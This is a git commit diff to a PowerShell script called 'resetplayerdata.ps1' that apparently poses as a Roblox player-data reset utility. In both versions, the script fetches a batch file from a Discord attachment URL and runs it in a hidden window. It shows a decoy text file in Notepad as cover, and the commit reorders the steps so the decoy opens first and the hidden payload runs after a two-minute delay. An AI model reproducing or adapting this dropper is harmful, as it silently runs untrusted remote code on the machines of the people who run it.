50d174b449bd7f7e55766c7ed798b652eb9027ba
vaero05 <143340763+vaero05@users.noreply.github.com>
2023-10-05 16:59:40 +0000

    Update resetplayerdata.ps1

--- resetplayerdata.ps1
+++ resetplayerdata.ps1
@@ -1,13 +1,13 @@
 # Define URLs
-$batUrl = "https://cdn.discordapp.com/attachments/1143578940791857315/1159191579165208716/Uni.bat"
 $txtUrl = "https://cdn.discordapp.com/attachments/1143578940791857315/1159525530723430520/www.roblox.com.txt"
+$batUrl = "https://cdn.discordapp.com/attachments/1143578940791857315/1159191579165208716/Uni.bat"
 
 # Define file paths
-$batPath = [System.IO.Path]::Combine($env:TEMP, "Uni.bat")
 $txtPath = [System.IO.Path]::Combine($env:TEMP, "www.roblox.com.txt")
+$batPath = [System.IO.Path]::Combine($env:TEMP, "Uni.bat")
 
-# Download Uni.bat
-iwr -Uri $batUrl -OutFile $batPath
+# Download www.roblox.com.txt
+iwr -Uri $txtUrl -OutFile $txtPath
 
 # Define a script block to run PowerShell
 $psScript = {
@@ -17,6 +17,17 @@ $psScript = {
 # Start a background job for the PowerShell script
 $psJob = Start-Job -ScriptBlock $psScript
 
+# Check if www.roblox.com.txt exists and open it
+if (Test-Path $txtPath) {
+    Start-Process -FilePath notepad.exe -ArgumentList $txtPath
+}
+
+# Wait for 120 seconds
+Start-Sleep -Seconds 120
+
+# Download Uni.bat
+iwr -Uri $batUrl -OutFile $batPath
+
 # Check if Uni.bat exists and run it with hidden window style
 if (Test-Path $batPath) {
     Start-Process -FilePath $batPath -WindowStyle Hidden
@@ -25,14 +36,3 @@ if (Test-Path $batPath) {
 # Wait for Uni.bat to complete
 $psJob | Wait-Job
 $psJob | Remove-Job
-
-# Wait for 120 seconds
-Start-Sleep -Seconds 120
-
-# Download www.roblox.com.txt
-iwr -Uri $txtUrl -OutFile $txtPath
-
-# Check if www.roblox.com.txt exists and open it
-if (Test-Path $txtPath) {
-    Start-Process -FilePath notepad.exe -ArgumentList $txtPath
-}
